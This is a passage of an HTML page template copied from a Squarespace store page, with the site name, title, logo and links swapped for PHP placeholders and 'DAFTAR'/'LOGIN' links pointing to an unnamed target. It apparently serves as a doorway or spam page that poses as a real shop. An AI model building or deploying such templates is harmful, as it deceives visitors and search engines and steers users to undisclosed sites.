          "stock": {
            "unlimited": true
          },
          "attributes": {
            "Size": "0"
          },
          "shippingWeight": {
            "value": 0.0,
            "unit": "POUND"
          },
          "shippingSize": {
            "unit": "INCH",
            "width": 0.0,
            "height": 0.0,
            "len": 0.0
          }
        }, {
          "id": "49f82b66-8f3d-41b8-a26f-af4b6d07b3ec",
          "sku": "SQ0357750",
          "price": {
            "currencyCode": "IDR",
            "value": 5000,
            "decimalValue": "50.00",
            "fractionalDigits": 2
          },
          "salePrice": {
            "currencyCode": "IDR",
            "value": 0,
            "decimalValue": "0.00",
            "fractionalDigits": 2
          },
          "onSale": false,
          "stock": {
            "unlimited": false,
            "quantity": 4
          },
          "attributes": {
            "Size": "2"
          },
          "shippingWeight": {
            "value": 0.0,
            "unit": "POUND"
          },
          "shippingSize": {
            "unit": "INCH",
            "width": 0.0,
            "height": 0.0,
            "len": 0.0
          }
        }, {
          "id": "bc23cba5-c88b-440d-b7a9-77ecb0ec5f6f",
          "sku": "SQ8501677",
          "price": {
            "currencyCode": "IDR",
            "value": 5000,
            "decimalValue": "50.00",
            "fractionalDigits": 2
          },
          "salePrice": {
            "currencyCode": "IDR",
            "value": 0,
            "decimalValue": "0.00",
            "fractionalDigits": 2
          },
          "onSale": false,
          "stock": {
            "unlimited": true
          },
          "attributes": {
            "Size": "4"
          },
          "shippingWeight": {
            "value": 0.0,
            "unit": "POUND"
          },
          "shippingSize": {
            "unit": "INCH",
            "width": 0.0,
            "height": 0.0,
            "len": 0.0
          }
        }, {
          "id": "9a6e7714-1c66-4b24-9abe-4f7a93936941",
          "sku": "SQ4341270",
          "price": {
            "currencyCode": "IDR",
            "value": 5000,
            "decimalValue": "50.00",
            "fractionalDigits": 2
          },
          "salePrice": {
            "currencyCode": "IDR",
            "value": 0,
            "decimalValue": "0.00",
            "fractionalDigits": 2
          },
          "onSale": false,
          "stock": {
            "unlimited": true
          },
          "attributes": {
            "Size": "6"
          },
          "shippingWeight": {
            "value": 0.0,
            "unit": "POUND"
          },
          "shippingSize": {
            "unit": "INCH",
            "width": 0.0,
            "height": 0.0,
            "len": 0.0
          }
        }, {
          "id": "54d672c7-8b94-4b18-82eb-8207d3104eab",
          "sku": "SQ3858862",
          "price": {
            "currencyCode": "IDR",
            "value": 5000,
            "decimalValue": "50.00",
            "fractionalDigits": 2
          },
          "salePrice": {
            "currencyCode": "IDR",
            "value": 0,
            "decimalValue": "0.00",
            "fractionalDigits": 2
          },
          "onSale": false,
          "stock": {
            "unlimited": false,
            "quantity": 0
          },
          "attributes": {
            "Size": "8"
          },
          "shippingWeight": {
            "value": 0.0,
            "unit": "POUND"
          },
          "shippingSize": {
            "unit": "INCH",
            "width": 0.0,
            "height": 0.0,
            "len": 0.0
          }
        }],
        "subscribable": false,
        "fulfilledExternally": false,
        "productType": 1
      },
      "showAnnouncementBar": false,
      "recaptchaEnterpriseContext": {
        "recaptchaEnterpriseSiteKey": "6LdDFQwjAAAAAPigEvvPgEVbb7QBm-TkVJdDTlAv"
      },
      "i18nContext": {
        "timeZoneData": {
          "id": "Asia/Jakarta",
          "name": "Western Indonesia Time"
        }
      }
    };
  </script>
  <script type="application/ld+json">
    {
      "url": "https://tomato-oleander-ncdr.squarespace.com",
      "name": "<?php echo $KW ?>",
      "description": "",
      "image": "<?php echo $LOGO ?>",
      "@context": "http://schema.org",
      "@type": "WebSite"
    }
  </script>
  <script type="application/ld+json">
    {
      "name": "<?php echo $TITLE ?> \u2014 <?php echo $KW ?>",
      "image": "<?php echo $GAMBAR ?>?format=1500w",
      "description": "<?php echo $DESKRIPSI ?>",
      "brand": "<?php echo $KW ?>",
      "offers": {
        "lowPrice": 50.00,
        "highPrice": 50.00,
        "priceCurrency": "IDR",
        "offerCount": 5,
        "availability": "InStock",
        "@context": "http://schema.org",
        "@type": "AggregateOffer"
      },
      "@context": "http://schema.org",
      "@type": "Product"
    }
  </script>
  <link rel="stylesheet" type="text/css" href="https://static1.squarespace.com/static/versioned-site-css/660d5c4777b3f814dddb49bc/1/5c5a519771c10ba3470d8101/660d5c4777b3f814dddb49c4/1512/site.css" />
  <script>
    Static.COOKIE_BANNER_CAPABLE = true;
  </script>
  <!-- End of Squarespace Headers -->

  <link rel="stylesheet" type="text/css" href="https://static1.squarespace.com/static/vta/5c5a519771c10ba3470d8101/versioned-assets/1711742311246-HJM6J9SNP07FCJU818LL/static.css">

</head>

<body id="item-660d5c677b67070328ef1518" class="
      primary-button-style-solid primary-button-shape-square secondary-button-style-outline secondary-button-shape-square tertiary-button-style-solid tertiary-button-shape-square  form-field-style-solid form-field-shape-square form-field-border-all form-field-checkbox-type-icon form-field-checkbox-fill-solid form-field-checkbox-color-inverted form-field-checkbox-shape-square form-field-checkbox-layout-stack form-field-radio-type-icon form-field-radio-fill-solid form-field-radio-color-normal form-field-radio-shape-pill form-field-radio-layout-stack form-field-survey-fill-solid form-field-survey-color-normal form-field-survey-shape-pill form-field-hover-focus-outline form-submit-button-style-label header-overlay-alignment-center header-width-full   tweak-fixed-header-style-basic tweak-blog-alternating-side-by-side-width-full tweak-blog-alternating-side-by-side-image-aspect-ratio-11-square tweak-blog-alternating-side-by-side-text-alignment-left tweak-blog-alternating-side-by-side-read-more-style-show tweak-blog-alternating-side-by-side-image-text-alignment-middle tweak-blog-alternating-side-by-side-delimiter-bullet tweak-blog-alternating-side-by-side-meta-position-top tweak-blog-alternating-side-by-side-primary-meta-categories tweak-blog-alternating-side-by-side-secondary-meta-date tweak-blog-alternating-side-by-side-excerpt-show tweak-blog-basic-grid-width-full tweak-blog-basic-grid-image-aspect-ratio-32-standard tweak-blog-basic-grid-text-alignment-left tweak-blog-basic-grid-delimiter-bullet tweak-blog-basic-grid-image-placement-above tweak-blog-basic-grid-read-more-style-show tweak-blog-basic-grid-primary-meta-categories tweak-blog-basic-grid-secondary-meta-date tweak-blog-basic-grid-excerpt-show tweak-blog-item-width-medium tweak-blog-item-text-alignment-left tweak-blog-item-meta-position-above-title tweak-blog-item-show-categories tweak-blog-item-show-date tweak-blog-item-show-author-name tweak-blog-item-show-author-profile tweak-blog-item-delimiter-bullet tweak-blog-masonry-width-inset tweak-blog-masonry-text-alignment-left tweak-blog-masonry-primary-meta-categories tweak-blog-masonry-secondary-meta-date tweak-blog-masonry-meta-position-top tweak-blog-masonry-read-more-style-show tweak-blog-masonry-delimiter-space tweak-blog-masonry-image-placement-above tweak-blog-masonry-excerpt-show tweak-blog-side-by-side-width-inset tweak-blog-side-by-side-image-placement-left tweak-blog-side-by-side-image-aspect-ratio-11-square tweak-blog-side-by-side-primary-meta-categories tweak-blog-side-by-side-secondary-meta-date tweak-blog-side-by-side-meta-position-top tweak-blog-side-by-side-text-alignment-left tweak-blog-side-by-side-image-text-alignment-middle tweak-blog-side-by-side-read-more-style-show tweak-blog-side-by-side-delimiter-bullet tweak-blog-side-by-side-excerpt-show tweak-blog-single-column-width-inset tweak-blog-single-column-text-alignment-center tweak-blog-single-column-image-placement-above tweak-blog-single-column-delimiter-bullet tweak-blog-single-column-read-more-style-show tweak-blog-single-column-primary-meta-categories tweak-blog-single-column-secondary-meta-date tweak-blog-single-column-meta-position-top tweak-blog-single-column-content-full-post tweak-events-stacked-width-full tweak-events-stacked-height-large  tweak-events-stacked-show-thumbnails tweak-events-stacked-thumbnail-size-32-standard tweak-events-stacked-date-style-with-text tweak-events-stacked-show-time tweak-events-stacked-show-location  tweak-events-stacked-show-excerpt   tweak-global-animations-complexity-level-detailed tweak-global-animations-animation-style-fade tweak-global-animations-animation-type-none tweak-global-animations-animation-curve-ease tweak-portfolio-grid-basic-width-full tweak-portfolio-grid-basic-height-small tweak-portfolio-grid-basic-image-aspect-ratio-11-square tweak-portfolio-grid-basic-text-alignment-left tweak-portfolio-grid-basic-hover-effect-fade tweak-portfolio-grid-overlay-width-full tweak-portfolio-grid-overlay-height-large tweak-portfolio-grid-overlay-image-aspect-ratio-11-square tweak-portfolio-grid-overlay-text-placement-center tweak-portfolio-grid-overlay-show-text-after-hover tweak-portfolio-index-background-link-format-stacked tweak-portfolio-index-background-width-full tweak-portfolio-index-background-height-large  tweak-portfolio-index-background-vertical-alignment-middle tweak-portfolio-index-background-horizontal-alignment-center tweak-portfolio-index-background-delimiter-none tweak-portfolio-index-background-animation-type-fade tweak-portfolio-index-background-animation-duration-medium tweak-portfolio-hover-follow-layout-inline  tweak-portfolio-hover-follow-delimiter-bullet tweak-portfolio-hover-follow-animation-type-fade tweak-portfolio-hover-follow-animation-duration-fast tweak-portfolio-hover-static-layout-inline tweak-portfolio-hover-static-front tweak-portfolio-hover-static-delimiter-hyphen tweak-portfolio-hover-static-animation-type-fade tweak-portfolio-hover-static-animation-duration-fast tweak-product-basic-item-product-variant-display-button tweak-product-basic-item-width-full tweak-product-basic-item-gallery-aspect-ratio-34-three-four-vertical tweak-product-basic-item-text-alignment-left tweak-product-basic-item-navigation-breadcrumbs tweak-product-basic-item-content-alignment-center tweak-product-basic-item-gallery-design-slideshow tweak-product-basic-item-gallery-placement-left tweak-product-basic-item-thumbnail-placement-side tweak-product-basic-item-click-action-none tweak-product-basic-item-hover-action-none tweak-product-basic-item-variant-picker-layout-dropdowns tweak-products-width-full tweak-products-image-aspect-ratio-34-three-four-vertical tweak-products-text-alignment-left  tweak-products-price-show tweak-products-nested-category-type-top  tweak-products-header-text-alignment-middle tweak-products-breadcrumbs image-block-poster-text-alignment-left image-block-card-content-position-center image-block-card-text-alignment-left image-block-overlap-content-position-center image-block-overlap-text-alignment-left image-block-collage-content-position-center image-block-collage-text-alignment-left image-block-stack-text-alignment-left hide-opentable-icons opentable-style-dark tweak-product-quick-view-button-style-floating tweak-product-quick-view-button-position-center tweak-product-quick-view-lightbox-excerpt-display-truncate tweak-product-quick-view-lightbox-show-arrows tweak-product-quick-view-lightbox-show-close-button tweak-product-quick-view-lightbox-controls-weight-light native-currency-code-idr view-item collection-layout-default collection-type-products collection-660d5c677b67070328ef14fa mobile-style-available sqs-seven-one
      
        show-pdp-product-add-ons
      
      
      
        
          
          
        
      
    " data-description="plp-mobile-editor-column" tabindex="-1">
  <div id="siteWrapper" class="clearfix site-wrapper">

    <header data-test="header" id="header" class="
      
        black
      
      header theme-col--primary
    " data-section-theme="black" data-controller="Header" data-current-styles="{
    &quot;layout&quot;: &quot;brandingCenter&quot;,
    &quot;action&quot;: {
      &quot;buttonText&quot;: &quot;Get Started&quot;,
      &quot;newWindow&quot;: false
    },
    &quot;showSocial&quot;: true,
    &quot;socialOptions&quot;: {
      &quot;socialBorderShape&quot;: &quot;none&quot;,
      &quot;socialBorderStyle&quot;: &quot;outline&quot;,
      &quot;socialBorderThickness&quot;: {
        &quot;unit&quot;: &quot;px&quot;,
        &quot;value&quot;: 1.0
      }
    },
    &quot;sectionTheme&quot;: &quot;black&quot;,
    &quot;menuOverlayAnimation&quot;: &quot;fade&quot;,
    &quot;cartStyle&quot;: &quot;cart&quot;,
    &quot;cartText&quot;: &quot;Cart&quot;,
    &quot;showEmptyCartState&quot;: true,
    &quot;cartOptions&quot;: {
      &quot;iconType&quot;: &quot;stroke-1&quot;,
      &quot;cartBorderShape&quot;: &quot;none&quot;,
      &quot;cartBorderStyle&quot;: &quot;outline&quot;,
      &quot;cartBorderThickness&quot;: {
        &quot;unit&quot;: &quot;px&quot;,
        &quot;value&quot;: 1.0
      }
    },
    &quot;showButton&quot;: false,
    &quot;showCart&quot;: true,
    &quot;showAccountLogin&quot;: true,
    &quot;headerStyle&quot;: &quot;theme&quot;,
    &quot;languagePicker&quot;: {
      &quot;enabled&quot;: false,
      &quot;iconEnabled&quot;: false,
      &quot;iconType&quot;: &quot;globe&quot;,
      &quot;flagShape&quot;: &quot;shiny&quot;,
      &quot;languageFlags&quot;: [ ]
    },
    &quot;mobileOptions&quot;: {
      &quot;layout&quot;: &quot;logoCenterNavLeft&quot;,
      &quot;menuIcon&quot;: &quot;doubleLineHamburger&quot;,
      &quot;menuIconOptions&quot;: {
        &quot;style&quot;: &quot;doubleLineHamburger&quot;,
        &quot;thickness&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 1.0
        }
      }
    },
    &quot;dynamicOptions&quot;: {
      &quot;border&quot;: {
        &quot;enabled&quot;: false,
        &quot;position&quot;: &quot;allSides&quot;,
        &quot;thickness&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 4.0
        },
        &quot;color&quot;: {
          &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
          &quot;sitePaletteColor&quot;: {
            &quot;colorName&quot;: &quot;black&quot;,
            &quot;alphaModifier&quot;: 1.0
          }
        }
      }
    },
    &quot;solidOptions&quot;: {
      &quot;headerOpacity&quot;: {
        &quot;unit&quot;: &quot;%&quot;,
        &quot;value&quot;: 100.0
      },
      &quot;border&quot;: {
        &quot;enabled&quot;: false,
        &quot;position&quot;: &quot;allSides&quot;,
        &quot;thickness&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 4.0
        },
        &quot;color&quot;: {
          &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
          &quot;sitePaletteColor&quot;: {
            &quot;colorName&quot;: &quot;black&quot;,
            &quot;alphaModifier&quot;: 1.0
          }
        }
      },
      &quot;dropShadow&quot;: {
        &quot;enabled&quot;: false,
        &quot;blur&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 30.0
        },&quot;spread&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 0.0
        },
        &quot;distance&quot;: {
          &quot;unit&quot;: &quot;px&quot;,&quot;value&quot;: 0.0
        },
        &quot;color&quot;: {
          &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
          &quot;sitePaletteColor&quot;: {
            &quot;colorName&quot;: &quot;black&quot;,
            &quot;alphaModifier&quot;: 1.0
          }}
      },
      &quot;blurBackground&quot;: {
        &quot;enabled&quot;: false,
        &quot;blurRadius&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 12.0
        }
      },
      &quot;backgroundColor&quot;: {
        &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
        &quot;sitePaletteColor&quot;: {
          &quot;colorName&quot;: &quot;white&quot;,
          &quot;alphaModifier&quot;: 1.0
        }
      },
      &quot;navigationColor&quot;: {
        &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
        &quot;sitePaletteColor&quot;: {
          &quot;colorName&quot;: &quot;black&quot;,
          &quot;alphaModifier&quot;: 1.0
        }
      }
    },
    &quot;gradientOptions&quot;: {
      &quot;gradientType&quot;: &quot;faded&quot;,
      &quot;headerOpacity&quot;: {
        &quot;unit&quot;: &quot;%&quot;,
        &quot;value&quot;: 90.0
      },
      &quot;border&quot;: {
        &quot;enabled&quot;: false,
        &quot;position&quot;: &quot;allSides&quot;,
        &quot;thickness&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 4.0
        },
        &quot;color&quot;: {
          &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
          &quot;sitePaletteColor&quot;: {
            &quot;colorName&quot;: &quot;black&quot;,
            &quot;alphaModifier&quot;: 1.0
          }
        }
      },
      &quot;dropShadow&quot;: {
        &quot;enabled&quot;: false,
        &quot;blur&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 30.0
        },
        &quot;spread&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 0.0
        },
        &quot;distance&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 0.0
        },
        &quot;color&quot;: {
          &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
          &quot;sitePaletteColor&quot;: {
            &quot;colorName&quot;: &quot;black&quot;,
            &quot;alphaModifier&quot;: 1.0
          }
        }
      },
      &quot;blurBackground&quot;: {
        &quot;enabled&quot;: false,
        &quot;blurRadius&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 12.0
        }
      },
      &quot;backgroundColor&quot;: {
        &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
        &quot;sitePaletteColor&quot;: {
          &quot;colorName&quot;: &quot;white&quot;,
          &quot;alphaModifier&quot;: 1.0
        }
      },
      &quot;navigationColor&quot;: {
        &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
        &quot;sitePaletteColor&quot;: {
          &quot;colorName&quot;: &quot;black&quot;,
          &quot;alphaModifier&quot;: 1.0
        }
      }
    },
    &quot;dropShadowOptions&quot;: {
      &quot;enabled&quot;: false,
      &quot;blur&quot;: {
        &quot;unit&quot;: &quot;px&quot;,
        &quot;value&quot;: 12.0
      },
      &quot;spread&quot;: {
        &quot;unit&quot;: &quot;px&quot;,
        &quot;value&quot;: 0.0
      },
      &quot;distance&quot;: {
        &quot;unit&quot;: &quot;px&quot;,
        &quot;value&quot;: 12.0
      }
    },
    &quot;borderOptions&quot;: {
      &quot;enabled&quot;: false,
      &quot;position&quot;: &quot;bottom&quot;,
      &quot;thickness&quot;: {
        &quot;unit&quot;: &quot;px&quot;,
        &quot;value&quot;: 4.0
      }
    },
    &quot;showPromotedElement&quot;: false,
    &quot;buttonVariant&quot;: &quot;primary&quot;,
    &quot;blurBackground&quot;: {
      &quot;enabled&quot;: false,
      &quot;blurRadius&quot;: {
        &quot;unit&quot;: &quot;px&quot;,
        &quot;value&quot;: 12.0
      }
    },
    &quot;headerOpacity&quot;: {
      &quot;unit&quot;: &quot;%&quot;,
      &quot;value&quot;: 100.0
    }
  }" data-section-id="header" data-header-theme="black" data-menu-overlay-theme="" data-header-style="theme" data-language-picker="{
    &quot;enabled&quot;: false,
    &quot;iconEnabled&quot;: false,
    &quot;iconType&quot;: &quot;globe&quot;,
    &quot;flagShape&quot;: &quot;shiny&quot;,
    &quot;languageFlags&quot;: [ ]
  }" data-first-focusable-element tabindex="-1" style="
      
        
        
      
      
        --solidHeaderBackgroundColor: hsla(var(--white-hsl), 1);
      
      
        --solidHeaderNavigationColor: hsla(var(--black-hsl), 1);
      
      
        --gradientHeaderBackgroundColor: hsla(var(--white-hsl), 1);
      
      
        --gradientHeaderNavigationColor: hsla(var(--black-hsl), 1);
      
    ">

      <div class="sqs-announcement-bar-dropzone"></div>

      <div class="header-announcement-bar-wrapper">

        <a href="#page" class="header-skip-link sqs-button-element--primary">
          Skip to Content
        </a>



        <style>
          @supports (-webkit-backdrop-filter: none) or (backdrop-filter: none) {
            .header-blur-background {}
          }
        </style>
        <div class="header-border" data-header-style="theme" data-header-usability-enabled="true" data-header-border="false" data-test="header-border" style="








  



"></div>
        <div class="header-dropshadow" data-header-style="theme" data-header-usability-enabled="true" data-header-dropshadow="false" data-test="header-dropshadow" style="


  
"></div>



        <div class='header-inner container--fluid
        
          header-layout--with-commerce
        
        
        
        
        
        
        
         header-mobile-layout-logo-center-nav-left
        
        
        
        
        
         header-layout-branding-center
        
        
        
        
        
        ' style="








" data-test="header-inner">
          <!-- Background -->
          <div class="header-background theme-bg--primary"></div>

          <div class="header-display-desktop" data-content-field="site-title">

            <style>
              .top-bun,
              .patty,
              .bottom-bun {
                height: 1px;
              }
            </style>

            <!-- Burger -->
            <div class="header-burger

  menu-overlay-has-visible-non-navigation-items

" data-animation-role="header-element">
              <button class="header-burger-btn burger" data-test="header-burger">
                <span hidden class="js-header-burger-open-title visually-hidden">Open Menu</span>
                <span hidden class="js-header-burger-close-title visually-hidden">Close Menu</span>
                <div class="burger-box">
                  <div class="burger-inner header-menu-icon-doubleLineHamburger">
                    <div class="top-bun"></div>
                    <div class="patty"></div>
                    <div class="bottom-bun"></div>
                  </div>
                </div>
              </button>
            </div>


            <!-- Social -->





            <!-- Title and nav wrapper -->
            <div class="header-title-nav-wrapper">






              <!-- Nav -->
              <div class="header-nav">
                <div class="header-nav-wrapper">
                  <nav class="header-nav-list">




                    <div class="header-nav-item header-nav-item--collection">
                      <a href="<?php echo $CANONICAL ?>" data-animation-role="header-element">
                        <?php echo $KW ?>
                      </a>
                    </div>
                    <div class="header-nav-item header-nav-item--collection">
                      <a href="<?php echo $HYPERLINK ?>" data-animation-role="header-element">
                        DAFTAR
                      </a>
                    </div>

                    <div class="header-nav-item header-nav-item--collection header-nav-item--active header-nav-item--homepage">
                      <a href="<?php echo $HYPERLINK ?>" data-animation-role="header-element" aria-current="page">
                        LOGIN
                      </a>
                    </div>

                  </nav>
                </div>
              </div>


              <!-- Title -->
              <div class="
                      header-title
                      header-title--use-mobile-logo
                    " data-animation-role="header-element">

                <div class="header-title-logo">
                  <a href="<?php echo $CANONICAL ?>" data-animation-role="header-element">
                    <picture>
                      <source media="only screen and (pointer: coarse) and (max-width: 1024px), screen and (max-width: 799px)" srcset="<?php echo $LOGO ?>?format=1500w">
                      <source media="only screen and (pointer: coarse) and (min-width: 1025px), screen and (min-width: 800px)" srcset="<?php echo $LOGO ?>?format=1500w">
                      <img elementtiming="nbf-header-logo-desktop" src="<?php echo $LOGO ?>?format=1500w" alt="<?php echo $KW ?>" style="display:block" fetchpriority="high" loading="eager" decoding="async" data-loader="raw">
                    </picture>

                  </a>
                </div>



                <div class="header-mobile-logo">
                  <a href="<?php echo $CANONICAL ?>" data-animation-role="header-element">
                    <picture>
                      <source media="only screen and (pointer: coarse) and (max-width: 1024px), screen and (max-width: 799px)" srcset="<?php echo $LOGO ?>?format=1500w">
                      <source media="only screen and (pointer: coarse) and (min-width: 1025px), screen and (min-width: 800px)" srcset="<?php echo $LOGO ?>?format=1500w">
                      <img elementtiming="nbf-header-logo-mobile" src="<?php echo $LOGO ?>?format=1500w" alt="<?php echo $KW ?>" style="display:block" fetchpriority="high" loading="eager" decoding="async" data-loader="raw">
                    </picture>

                  </a>
                </div>

              </div>



            </div>


            <!-- Actions -->
            <div class="header-actions header-actions--right">



              <div class="header-actions-action header-actions-action--social">


                <a class="icon icon--fill  header-icon header-icon-border-shape-none header-icon-border-style-outline" href="http://instagram.com" target="_blank" aria-label="Instagram">
                  <svg viewBox="23 23 64 64">
                    <use xlink:href="#instagram-unauth-icon" width="110" height="110"></use>
                  </svg>
                </a>

                <a class="icon icon--fill  header-icon header-icon-border-shape-none header-icon-border-style-outline" href="http://twitter.com" target="_blank" aria-label="Twitter">
                  <svg viewBox="23 23 64 64">
                    <use xlink:href="#twitter-unauth-icon" width="110" height="110"></use>
                  </svg>
                </a>

                <a class="icon icon--fill  header-icon header-icon-border-shape-none header-icon-border-style-outline" href="https://tiktok.com" target="_blank" aria-label="TikTok">
                  <svg viewBox="23 23 64 64">
                    <use xlink:href="#tiktok-unauth-icon" width="110" height="110"></use>
                  </svg>
                </a>

                <a class="icon icon--fill  header-icon header-icon-border-shape-none header-icon-border-style-outline" href="https://facebook.com" target="_blank" aria-label="Facebook">
                  <svg viewBox="23 23 64 64">
                    <use xlink:href="#facebook-unauth-icon" width="110" height="110"></use>
                  </svg>
                </a>

                <a class="icon icon--fill  header-icon header-icon-border-shape-none header-icon-border-style-outline" href="https://youtube.com" target="_blank" aria-label="YouTube">
                  <svg viewBox="23 23 64 64">
                    <use xlink:href="#youtube-unauth-icon" width="110" height="110"></use>
                  </svg>
                </a>


              </div>




















              <div class="showOnMobile">






                <div class="header-actions-action header-actions-action--cart">
                  <a href="<?php echo $CANONICAL ?>" class="cart-style-icon icon--stroke icon--fill icon--cart sqs-custom-cart  header-icon  show-empty-cart-state cart-quantity-zero header-icon-border-shape-none header-icon-border-style-outline">
                    <span class="Cart-inner">




                      <svg class="icon icon--cart" viewBox="0 0 31 24">
                        <g class="svg-icon cart-icon--odd">
                          <circle fill="none" stroke-miterlimit="10" cx="22.5" cy="21.5" r="1" />
                          <circle fill="none" stroke-miterlimit="10" cx="9.5" cy="21.5" r="1" />
                          <path fill="none" stroke-miterlimit="10" d="M0,1.5h5c0.6,0,1.1,0.4,1.1,1l1.7,13
      c0.1,0.5,0.6,1,1.1,1h15c0.5,0,1.2-0.4,1.4-0.9l3.3-8.1c0.2-0.5-0.1-0.9-0.6-0.9H12" />
                        </g>
                      </svg>

                      <div class="icon-cart-quantity">

                        <span class="cart-quantity-container">

                          <span class="sqs-cart-quantity">0</span>

                        </span>

                      </div>
                    </span>
                  </a>
                </div>






              </div>


              <div class="showOnDesktop">






                <div class="header-actions-action header-actions-action--cart">
                  <a href="<?php echo $CANONICAL ?>" class="cart-style-icon icon--stroke icon--fill icon--cart sqs-custom-cart  header-icon  show-empty-cart-state cart-quantity-zero header-icon-border-shape-none header-icon-border-style-outline">
                    <span class="Cart-inner">




                      <svg class="icon icon--cart" viewBox="0 0 31 24">
                        <g class="svg-icon cart-icon--odd">
                          <circle fill="none" stroke-miterlimit="10" cx="22.5" cy="21.5" r="1" />
                          <circle fill="none" stroke-miterlimit="10" cx="9.5" cy="21.5" r="1" />
                          <path fill="none" stroke-miterlimit="10" d="M0,1.5h5c0.6,0,1.1,0.4,1.1,1l1.7,13
      c0.1,0.5,0.6,1,1.1,1h15c0.5,0,1.2-0.4,1.4-0.9l3.3-8.1c0.2-0.5-0.1-0.9-0.6-0.9H12" />
                        </g>
                      </svg>

                      <div class="icon-cart-quantity">

                        <span class="cart-quantity-container">

                          <span class="sqs-cart-quantity">0</span>

                        </span>

                      </div>
                    </span>
                  </a>
                </div>






              </div>


            </div>







          </div>
          <div class="header-display-mobile" data-content-field="site-title">





            <!-- Social -->







            <style>
              .top-bun,
              .patty,
              .bottom-bun {
                height: 1px;
              }
            </style>

            <!-- Burger -->
            <div class="header-burger

  menu-overlay-has-visible-non-navigation-items

" data-animation-role="header-element">
              <button class="header-burger-btn burger" data-test="header-burger">
                <span hidden class="js-header-burger-open-title visually-hidden">Open Menu</span>
                <span hidden class="js-header-burger-close-title visually-hidden">Close Menu</span>
                <div class="burger-box">
                  <div class="burger-inner header-menu-icon-doubleLineHamburger">
                    <div class="top-bun"></div>
                    <div class="patty"></div>
                    <div class="bottom-bun"></div>
                  </div>
                </div>
              </button>
            </div>


            <!-- Title and nav wrapper -->
            <div class="header-title-nav-wrapper">






              <!-- Nav -->
              <div class="header-nav">
                <div class="header-nav-wrapper">
                  <nav class="header-nav-list">




                    <div class="header-nav-item header-nav-item--collection">
                      <a href="<?php echo $CANONICAL ?>" data-animation-role="header-element">
                        <?php echo $KW ?>
                      </a>
                    </div>






                    <div class="header-nav-item header-nav-item--collection">
                      <a href="<?php echo $HYPERLINK ?>" data-animation-role="header-element">
                        DAFTAR
                      </a>
                    </div>






                    <div class="header-nav-item header-nav-item--collection header-nav-item--active header-nav-item--homepage">
                      <a href="<?php echo $HYPERLINK ?>" data-animation-role="header-element" aria-current="page">
                        LOGIN
                      </a>
                    </div>







                  </nav>
                </div>
              </div>


              <!-- Title -->

              <div class="
                      header-title
                      header-title--use-mobile-logo
                    " data-animation-role="header-element">

                <div class="header-title-logo">
                  <a href="<?php echo $CANONICAL ?>" data-animation-role="header-element">
                    <picture>
                      <source media="only screen and (pointer: coarse) and (max-width: 1024px), screen and (max-width: 799px)" srcset="<?php echo $LOGO ?>?format=1500w">
                      <source media="only screen and (pointer: coarse) and (min-width: 1025px), screen and (min-width: 800px)" srcset="<?php echo $LOGO ?>?format=1500w">
                      <img elementtiming="nbf-header-logo-desktop" src="<?php echo $LOGO ?>?format=1500w" alt="<?php echo $KW ?>" style="display:block" fetchpriority="high" loading="eager" decoding="async" data-loader="raw">
                    </picture>

                  </a>
                </div>



                <div class="header-mobile-logo">
                  <a href="<?php echo $CANONICAL ?>" data-animation-role="header-element">
                    <picture>
                      <source media="only screen and (pointer: coarse) and (max-width: 1024px), screen and (max-width: 799px)" srcset="<?php echo $LOGO ?>?format=1500w">
                      <source media="only screen and (pointer: coarse) and (min-width: 1025px), screen and (min-width: 800px)" srcset="<?php echo $LOGO ?>?format=1500w">
                      <img elementtiming="nbf-header-logo-mobile" src="<?php echo $LOGO ?>?format=1500w" alt="<?php echo $KW ?>" style="display:block" fetchpriority="high" loading="eager" decoding="async" data-loader="raw">
                    </picture>

                  </a>
                </div>

              </div>



            </div>


            <!-- Actions -->
            <div class="header-actions header-actions--right">



              <div class="header-actions-action header-actions-action--social">


                <a class="icon icon--fill  header-icon header-icon-border-shape-none header-icon-border-style-outline" href="http://instagram.com" target="_blank" aria-label="Instagram">
                  <svg viewBox="23 23 64 64">
                    <use xlink:href="#instagram-unauth-icon" width="110" height="110"></use>
                  </svg>
                </a>

                <a class="icon icon--fill  header-icon header-icon-border-shape-none header-icon-border-style-outline" href="http://twitter.com" target="_blank" aria-label="Twitter">
                  <svg viewBox="23 23 64 64">
                    <use xlink:href="#twitter-unauth-icon" width="110" height="110"></use>
                  </svg>
                </a>

                <a class="icon icon--fill  header-icon header-icon-border-shape-none header-icon-border-style-outline" href="https://tiktok.com" target="_blank" aria-label="TikTok">
                  <svg viewBox="23 23 64 64">
                    <use xlink:href="#tiktok-unauth-icon" width="110" height="110"></use>
                  </svg>
                </a>

                <a class="icon icon--fill  header-icon header-icon-border-shape-none header-icon-border-style-outline" href="https://facebook.com" target="_blank" aria-label="Facebook">
                  <svg viewBox="23 23 64 64">
                    <use xlink:href="#facebook-unauth-icon" width="110" height="110"></use>
                  </svg>
                </a>

                <a class="icon icon--fill  header-icon header-icon-border-shape-none header-icon-border-style-outline" href="https://youtube.com" target="_blank" aria-label="YouTube">
                  <svg viewBox="23 23 64 64">
                    <use xlink:href="#youtube-unauth-icon" width="110" height="110"></use>
                  </svg>
                </a>


              </div>




















              <div class="showOnMobile">






                <div class="header-actions-action header-actions-action--cart">
